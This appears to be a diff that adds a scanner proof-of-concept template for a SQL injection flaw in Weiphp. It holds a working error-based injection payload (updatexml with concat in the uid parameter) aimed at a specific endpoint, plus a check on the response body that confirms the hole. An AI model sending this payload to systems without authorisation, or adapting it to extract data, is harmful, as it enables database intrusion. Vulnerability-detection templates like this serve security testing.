@@ -1,0 +1,22 @@
+id: poc-yaml-weiphp-sql
+info:
+  name: Weiphp Sql
+  severity: high
+  tags:
+  - sql-injection
+  finger: Weiphp
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5({{.rand}}),0x7e),1)--+
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, substr(md5(rand),0,31))
+  output: []
